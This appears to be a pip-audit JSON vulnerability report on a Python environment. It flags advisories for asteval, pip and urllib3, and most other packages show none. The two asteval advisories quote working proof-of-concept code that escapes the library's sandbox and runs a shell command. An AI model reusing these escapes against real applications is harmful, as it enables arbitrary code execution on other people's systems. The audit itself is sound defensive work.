{"dependencies": [{"name": "aiodns", "version": "3.5.0", "vulns": []}, {"name": "aiohappyeyeballs", "version": "2.6.1", "vulns": []}, {"name": "aiohttp", "version": "3.13.0", "vulns": []}, {"name": "aiomultiprocess", "version": "0.9.1", "vulns": []}, {"name": "aiosignal", "version": "1.4.0", "vulns": []}, {"name": "annotated-types", "version": "0.7.0", "vulns": []}, {"name": "anyio", "version": "4.11.0", "vulns": []}, {"name": "argcomplete", "version": "3.6.2", "vulns": []}, {"name": "asteval", "version": "1.0.5", "vulns": [{"id": "GHSA-vp47-9734-prjw", "fix_versions": ["1.0.6"], "aliases": [], "description": "### Summary If an attacker can control the input to the asteval library, they can bypass its safety restrictions and execute arbitrary Python code within the application's context.  ### Details The vulnerability is rooted in how `asteval` performs attribute access verification. In particular, the [`on_attribute`](https://github.com/lmfit/asteval/blob/8d7326df8015cf6a57506b1c2c167a1c3763e090/asteval/asteval.py#L565) node handler prevents access to attributes that are either present in the `UNSAFE_ATTRS` list or are formed by names starting and ending with `__`, as shown in the code snippet below:  ```py     def on_attribute(self, node):    # ('value', 'attr', 'ctx')         \"\"\"Extract attribute.\"\"\"          ctx = node.ctx.__class__         if ctx == ast.Store:             msg = \"attribute for storage: shouldn't be here!\"             self.raise_exception(node, exc=RuntimeError, msg=msg)          sym = self.run(node.value)         if ctx == ast.Del:             return delattr(sym, node.attr)         #         unsafe = (node.attr in UNSAFE_ATTRS or                  (node.attr.startswith('__') and node.attr.endswith('__')))         if not unsafe:             for dtype, attrlist in UNSAFE_ATTRS_DTYPES.items():                 unsafe = isinstance(sym, dtype) and node.attr in attrlist                 if unsafe:                     break         if unsafe:             msg = f\"no safe attribute '{node.attr}' for {repr(sym)}\"             self.raise_exception(node, exc=AttributeError, msg=msg)         else:             try:                 return getattr(sym, node.attr)             except AttributeError:                 pass ```  While this check is intended to block access to sensitive Python dunder methods (such as `__getattribute__`), the flaw arises because instances of the `Procedure` class expose their AST (stored in the `body` attribute) without proper protection:  ```py class Procedure:     \"\"\"Procedure: user-defined function for asteval.      This stores the parsed ast nodes as from the 'functiondef' ast node     for later evaluation.      \"\"\"      def __init__(self, name, interp, doc=None, lineno=0,                  body=None, args=None, kwargs=None,                  vararg=None, varkws=None):         \"\"\"TODO: docstring in public method.\"\"\"         self.__ininit__ = True         self.name = name         self.__name__ = self.name         self.__asteval__ = interp         self.raise_exc = self.__asteval__.raise_exception         self.__doc__ = doc         self.body = body         self.argnames = args         self.kwargs = kwargs         self.vararg = vararg         self.varkws = varkws         self.lineno = lineno         self.__ininit__ = False ```  Since the `body` attribute is not protected by a naming convention that would restrict its modification, an attacker can modify the AST of a `Procedure` during runtime to leverage unintended behaviour.  The exploit works as follows:  1. **The Time of Check, Time of Use (TOCTOU) Gadget:**     In the [code](https://github.com/lmfit/asteval/blob/8d7326df8015cf6a57506b1c2c167a1c3763e090/asteval/asteval.py#L577) below, a variable named `unsafe` is set based on whether `node.attr` is considered unsafe:     ```python    unsafe = (node.attr in UNSAFE_ATTRS or              (node.attr.startswith('__') and node.attr.endswith('__')))    ```  2. **Exploiting the TOCTOU Gadget:**     An attacker can abuse this gadget by hooking any `Attribute` AST node that is not in the `UNSAFE_ATTRS` list. The attacker modifies the `node.attr.startswith` function so that it points to a custom procedure. This custom procedure performs the following steps:        - It replaces the value of `node.attr` with the string `\"__getattribute__\"` and returns `False`.    - Thus, when `node.attr.startswith('__')` is evaluated, it returns `False`, which causes the condition to short-circuit and sets `unsafe` to `False`.    - However, by that time, `node.attr` has been changed to `\"__getattribute__\"`, which will be used in the subsequent `getattr(sym, node.attr)` call. An attacker can then use the obtained reference to `sym.__getattr__`to retrieve malicious attributes without needing to pass the `on_attribute` checks.  ### PoC The following proof-of-concept (PoC) demonstrates how this vulnerability can be exploited to execute the `whoami` command on the host machine:  ```py from asteval import Interpreter aeval = Interpreter() code = \"\"\" ga_str = \"__getattribute__\" def lender():     a     b def pwn():     ga = lender.dontcare     init = ga(\"__init__\")     ga = init.dontcare     globals = ga(\"__globals__\")     builtins = globals[\"__builtins__\"]     importer = builtins[\"__import__\"]     importer(\"os\").system(\"whoami\")  def startswith1(str):     # Replace the attr on the targeted AST node with \"__getattribute__\"     pwn.body[0].value.attr = ga_str     return False      def startswith2(str):     pwn.body[2].value.attr = ga_str     return False      n1 = lender.body[0] n1.startswith = startswith1 pwn.body[0].value.attr = n1  n2 = lender.body[1] n2.startswith = startswith2 pwn.body[2].value.attr = n2  pwn() \"\"\" aeval(code) ```"}, {"id": "GHSA-3wwr-3g9f-9gc7", "fix_versions": ["1.0.6"], "aliases": ["CVE-2025-24359"], "description": "### Summary If an attacker can control the input to the `asteval` library, they can bypass asteval's restrictions and execute arbitrary Python code in the context of the application using the library.  ### Details The vulnerability is rooted in how `asteval` performs handling of `FormattedValue` AST nodes. In particular, the [`on_formattedvalue`](https://github.com/lmfit/asteval/blob/cfb57f0beebe0dc0520a1fbabc35e66060c7ea71/asteval/asteval.py#L507) value uses the [dangerous format method of the str class](https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/), as shown in the vulnerable code snippet below:  ```py     def on_formattedvalue(self, node): # ('value', 'conversion', 'format_spec')         \"formatting used in f-strings\"         val = self.run(node.value)         fstring_converters = {115: str, 114: repr, 97: ascii}         if node.conversion in fstring_converters:             val = fstring_converters[node.conversion](val)         fmt = '{__fstring__}'         if node.format_spec is not None:             fmt = f'{{__fstring__:{self.run(node.format_spec)}}}'         return fmt.format(__fstring__=val) ```  The code above allows an attacker to manipulate the value of the string used in the dangerous call `fmt.format(__fstring__=val)`. This vulnerability can be exploited to access protected attributes by intentionally triggering an `AttributeError` exception. The attacker can then catch the exception and use its `obj` attribute to gain arbitrary access to sensitive or protected object properties.  ### PoC The following proof-of-concept (PoC) demonstrates how this vulnerability can be exploited to execute the `whoami` command on the host machine:  ```py from asteval import Interpreter aeval = Interpreter() code = \"\"\" # def lender(): #     ga      def pwn():     try:         f\"{dict.mro()[1]:'\\\\x7B__fstring__.__getattribute__.s\\\\x7D'}\"     except Exception as ga:         ga = ga.obj         sub = ga(dict.mro()[1],\"__subclasses__\")()         importer = None         for i in sub:             if \"BuiltinImporter\" in str(i):                 importer = i.load_module                 break         os = importer(\"os\")         os.system(\"whoami\")  # pre commit cfb57f0beebe0dc0520a1fbabc35e66060c7ea71, it was required to modify the AST to make this work using the code below # pwn.body[0].handlers[0].name = lender.body[0].value # need to make it an identifier so node_assign works          pwn() \"\"\" aeval(code)  ```"}]}, {"name": "attrs", "version": "25.4.0", "vulns": []}, {"name": "bandit", "version": "1.8.6", "vulns": []}, {"name": "bc-detect-secrets", "version": "1.5.45", "vulns": []}, {"name": "bc-jsonpath-ng", "version": "1.6.1", "vulns": []}, {"name": "bc-python-hcl2", "version": "0.4.3", "vulns": []}, {"name": "beartype", "version": "0.22.2", "vulns": []}, {"name": "beautifulsoup4", "version": "4.14.2", "vulns": []}, {"name": "black", "version": "25.9.0", "vulns": []}, {"name": "blinker", "version": "1.9.0", "vulns": []}, {"name": "boltons", "version": "21.0.0", "vulns": []}, {"name": "boolean-py", "version": "5.0", "vulns": []}, {"name": "boto3", "version": "1.35.49", "vulns": []}, {"name": "botocore", "version": "1.35.99", "vulns": []}, {"name": "bracex", "version": "2.6", "vulns": []}, {"name": "cachecontrol", "version": "0.14.3", "vulns": []}, {"name": "cached-property", "version": "2.0.1", "vulns": []}, {"name": "cachetools", "version": "5.5.2", "vulns": []}, {"name": "certifi", "version": "2025.10.5", "vulns": []}, {"name": "cffi", "version": "2.0.0", "vulns": []}, {"name": "cfgv", "version": "3.4.0", "vulns": []}, {"name": "charset-normalizer", "version": "3.4.3", "vulns": []}, {"name": "checkov", "version": "3.2.477", "vulns": []}, {"name": "click", "version": "8.3.0", "vulns": []}, {"name": "click-option-group", "version": "0.5.8", "vulns": []}, {"name": "cloudsplaining", "version": "0.7.0", "vulns": []}, {"name": "colorama", "version": "0.4.6", "vulns": []}, {"name": "configargparse", "version": "1.7.1", "vulns": []}, {"name": "contextlib2", "version": "21.6.0", "vulns": []}, {"name": "cyclonedx-python-lib", "version": "7.6.2", "vulns": []}, {"name": "decorator", "version": "5.2.1", "vulns": []}, {"name": "defusedxml", "version": "0.7.1", "vulns": []}, {"name": "distlib", "version": "0.4.0", "vulns": []}, {"name": "docker", "version": "7.1.0", "vulns": []}, {"name": "dockerfile-parse", "version": "2.0.1", "vulns": []}, {"name": "dpath", "version": "2.1.3", "vulns": []}, {"name": "exceptiongroup", "version": "1.2.2", "vulns": []}, {"name": "face", "version": "24.0.0", "vulns": []}, {"name": "filelock", "version": "3.19.1", "vulns": []}, {"name": "flake8", "version": "7.3.0", "vulns": []}, {"name": "flask", "version": "3.1.2", "vulns": []}, {"name": "frozenlist", "version": "1.8.0", "vulns": []}, {"name": "gitdb", "version": "4.0.12", "vulns": []}, {"name": "gitpython", "version": "3.1.45", "vulns": []}, {"name": "glom", "version": "22.1.0", "vulns": []}, {"name": "googleapis-common-protos", "version": "1.70.0", "vulns": []}, {"name": "h11", "version": "0.16.0", "vulns": []}, {"name": "httpcore", "version": "1.0.9", "vulns": []}, {"name": "httpx", "version": "0.28.1", "vulns": []}, {"name": "httpx-sse", "version": "0.4.2", "vulns": []}, {"name": "identify", "version": "2.6.15", "vulns": []}, {"name": "idna", "version": "3.10", "vulns": []}, {"name": "importlib-metadata", "version": "7.2.1", "vulns": []}, {"name": "iniconfig", "version": "2.1.0", "vulns": []}, {"name": "isort", "version": "6.1.0", "vulns": []}, {"name": "itsdangerous", "version": "2.2.0", "vulns": []}, {"name": "jinja2", "version": "3.1.6", "vulns": []}, {"name": "jmespath", "version": "1.0.1", "vulns": []}, {"name": "jsonschema", "version": "4.20.0", "vulns": []}, {"name": "jsonschema-specifications", "version": "2025.9.1", "vulns": []}, {"name": "junit-xml", "version": "1.9", "vulns": []}, {"name": "lark", "version": "1.3.0", "vulns": []}, {"name": "license-expression", "version": "30.4.4", "vulns": []}, {"name": "markdown", "version": "3.9", "vulns": []}, {"name": "markdown-it-py", "version": "4.0.0", "vulns": []}, {"name": "markupsafe", "version": "3.0.3", "vulns": []}, {"name": "mccabe", "version": "0.7.0", "vulns": []}, {"name": "mcp", "version": "1.12.2", "vulns": []}, {"name": "mdurl", "version": "0.1.2", "vulns": []}, {"name": "msgpack", "version": "1.1.1", "vulns": []}, {"name": "multidict", "version": "6.7.0", "vulns": []}, {"name": "mypy-extensions", "version": "1.1.0", "vulns": []}, {"name": "networkx", "version": "2.6.3", "vulns": []}, {"name": "nodeenv", "version": "1.9.1", "vulns": []}, {"name": "numpy", "version": "2.3.3", "vulns": []}, {"name": "opentelemetry-api", "version": "1.37.0", "vulns": []}, {"name": "opentelemetry-exporter-otlp-proto-common", "version": "1.37.0", "vulns": []}, {"name": "opentelemetry-exporter-otlp-proto-http", "version": "1.37.0", "vulns": []}, {"name": "opentelemetry-instrumentation", "version": "0.58b0", "vulns": []}, {"name": "opentelemetry-instrumentation-requests", "version": "0.58b0", "vulns": []}, {"name": "opentelemetry-proto", "version": "1.37.0", "vulns": []}, {"name": "opentelemetry-sdk", "version": "1.37.0", "vulns": []}, {"name": "opentelemetry-semantic-conventions", "version": "0.58b0", "vulns": []}, {"name": "opentelemetry-util-http", "version": "0.58b0", "vulns": []}, {"name": "orjson", "version": "3.11.3", "vulns": []}, {"name": "packageurl-python", "version": "0.13.4", "vulns": []}, {"name": "packaging", "version": "25.0", "vulns": []}, {"name": "pathspec", "version": "0.12.1", "vulns": []}, {"name": "peewee", "version": "3.18.2", "vulns": []}, {"name": "pip", "version": "25.2", "vulns": [{"id": "GHSA-4xh5-x5gv-qwph", "fix_versions": [], "aliases": ["CVE-2025-8869"], "description": "### Summary  In the fallback extraction path for source distributions, `pip` used Python\u2019s `tarfile` module without verifying that symbolic/hard link targets resolve inside the intended extraction directory. A malicious sdist can include links that escape the target directory and overwrite arbitrary files on the invoking host during `pip install`.  ### Impact  Successful exploitation enables arbitrary file overwrite outside the build/extraction directory on the machine running `pip`. This can be leveraged to tamper with configuration or startup files and may lead to further code execution depending on the environment, but the direct, guaranteed impact is integrity compromise on the vulnerable system.  ### Conditions  The issue is triggered when installing an attacker-controlled sdist (e.g., from an index or URL) and the fallback extraction code path is used. No special privileges are required beyond running `pip install`; active user action is necessary.  ### Remediation  The [fix](https://github.com/pypa/pip/pull/13550), while available as a patch that can be manually applied, has not yet been put into a numbered version but is planned for `25.3`. Using a Python interpreter that implements the safe-extraction behavior described by **PEP 706** provides additional defense in depth for other `tarfile` issues but is not a substitute for upgrading pip for this specific flaw."}]}, {"name": "pip-api", "version": "0.0.34", "vulns": []}, {"name": "pip-audit", "version": "2.9.0", "vulns": []}, {"name": "pip-requirements-parser", "version": "32.0.1", "vulns": []}, {"name": "platformdirs", "version": "4.4.0", "vulns": []}, {"name": "pluggy", "version": "1.6.0", "vulns": []}, {"name": "ply", "version": "3.11", "vulns": []}, {"name": "policy-sentry", "version": "0.13.2", "vulns": []}, {"name": "pre-commit", "version": "4.3.0", "vulns": []}, {"name": "prettytable", "version": "3.16.0", "vulns": []}, {"name": "propcache", "version": "0.4.1", "vulns": []}, {"name": "protobuf", "version": "6.32.1", "vulns": []}, {"name": "py-serializable", "version": "1.1.2", "vulns": []}, {"name": "pycares", "version": "4.11.0", "vulns": []}, {"name": "pycep-parser", "version": "0.5.1", "vulns": []}, {"name": "pycodestyle", "version": "2.14.0", "vulns": []}, {"name": "pycparser", "version": "2.23", "vulns": []}, {"name": "pydantic", "version": "2.12.0", "vulns": []}, {"name": "pydantic-core", "version": "2.41.1", "vulns": []}, {"name": "pydantic-settings", "version": "2.11.0", "vulns": []}, {"name": "pyflakes", "version": "3.4.0", "vulns": []}, {"name": "pygments", "version": "2.19.2", "vulns": []}, {"name": "pyparsing", "version": "3.2.5", "vulns": []}, {"name": "pytest", "version": "8.4.2", "vulns": []}, {"name": "python-dateutil", "version": "2.9.0.post0", "vulns": []}, {"name": "python-dotenv", "version": "1.1.1", "vulns": []}, {"name": "python-multipart", "version": "0.0.20", "vulns": []}, {"name": "pytokens", "version": "0.1.10", "vulns": []}, {"name": "pyyaml", "version": "6.0.3", "vulns": []}, {"name": "rdflib", "version": "7.2.1", "vulns": []}, {"name": "referencing", "version": "0.36.2", "vulns": []}, {"name": "regex", "version": "2025.9.18", "vulns": []}, {"name": "requests", "version": "2.32.5", "vulns": []}, {"name": "rich", "version": "13.5.3", "vulns": []}, {"name": "rpds-py", "version": "0.27.1", "vulns": []}, {"name": "ruamel-yaml", "version": "0.18.15", "vulns": []}, {"name": "ruamel-yaml-clib", "version": "0.2.12", "vulns": []}, {"name": "rustworkx", "version": "0.17.1", "vulns": []}, {"name": "s3transfer", "version": "0.10.4", "vulns": []}, {"name": "schema", "version": "0.7.5", "vulns": []}, {"name": "semantic-version", "version": "2.10.0", "vulns": []}, {"name": "semgrep", "version": "1.139.0", "vulns": []}, {"name": "six", "version": "1.17.0", "vulns": []}, {"name": "smmap", "version": "5.0.2", "vulns": []}, {"name": "sniffio", "version": "1.3.1", "vulns": []}, {"name": "sortedcontainers", "version": "2.4.0", "vulns": []}, {"name": "soupsieve", "version": "2.8", "vulns": []}, {"name": "spdx-tools", "version": "0.8.3", "vulns": []}, {"name": "sse-starlette", "version": "3.0.2", "vulns": []}, {"name": "starlette", "version": "0.48.0", "vulns": []}, {"name": "stevedore", "version": "5.5.0", "vulns": []}, {"name": "tabulate", "version": "0.9.0", "vulns": []}, {"name": "termcolor", "version": "2.3.0", "vulns": []}, {"name": "toml", "version": "0.10.2", "vulns": []}, {"name": "tomli", "version": "2.0.2", "vulns": []}, {"name": "tqdm", "version": "4.67.1", "vulns": []}, {"name": "typing-extensions", "version": "4.15.0", "vulns": []}, {"name": "typing-inspection", "version": "0.4.2", "vulns": []}, {"name": "unidiff", "version": "0.7.5", "vulns": []}, {"name": "uritools", "version": "5.0.0", "vulns": []}, {"name": "urllib3", "version": "1.26.20", "vulns": [{"id": "GHSA-pq67-6m6q-mj2v", "fix_versions": ["2.5.0"], "aliases": ["CVE-2025-50181"], "description": "urllib3 handles redirects and retries using the same mechanism, which is controlled by the `Retry` object. The most common way to disable redirects is at the request level, as follows:  ```python resp = urllib3.request(\"GET\", \"https://httpbin.org/redirect/1\", redirect=False) print(resp.status) # 302 ```  However, it is also possible to disable redirects, for all requests, by instantiating a `PoolManager` and specifying `retries` in a way that disable redirects:  ```python import urllib3  http = urllib3.PoolManager(retries=0)  # should raise MaxRetryError on redirect http = urllib3.PoolManager(retries=urllib3.Retry(redirect=0))  # equivalent to the above http = urllib3.PoolManager(retries=False)  # should return the first response  resp = http.request(\"GET\", \"https://httpbin.org/redirect/1\") ```  However, the `retries` parameter is currently ignored, which means all the above examples don't disable redirects.  ## Affected usages  Passing `retries` on `PoolManager` instantiation to disable redirects or restrict their number.  By default, requests and botocore users are not affected.  ## Impact  Redirects are often used to exploit SSRF vulnerabilities. An application attempting to mitigate SSRF or open redirect vulnerabilities by disabling redirects at the PoolManager level will remain vulnerable.  ## Remediation  You can remediate this vulnerability with the following steps:   * Upgrade to a patched version of urllib3. If your organization would benefit from the continued support of urllib3 1.x, please contact [sethmichaellarson@gmail.com](mailto:sethmichaellarson@gmail.com) to discuss sponsorship or contribution opportunities.  * Disable redirects at the `request()` level instead of the `PoolManager()` level."}]}, {"name": "uvicorn", "version": "0.37.0", "vulns": []}, {"name": "virtualenv", "version": "20.34.0", "vulns": []}, {"name": "wcmatch", "version": "8.5.2", "vulns": []}, {"name": "wcwidth", "version": "0.2.14", "vulns": []}, {"name": "werkzeug", "version": "3.1.3", "vulns": []}, {"name": "wrapt", "version": "1.17.3", "vulns": []}, {"name": "xmltodict", "version": "1.0.2", "vulns": []}, {"name": "yarl", "version": "1.22.0", "vulns": []}, {"name": "zipp", "version": "3.23.0", "vulns": []}], "fixes": []}
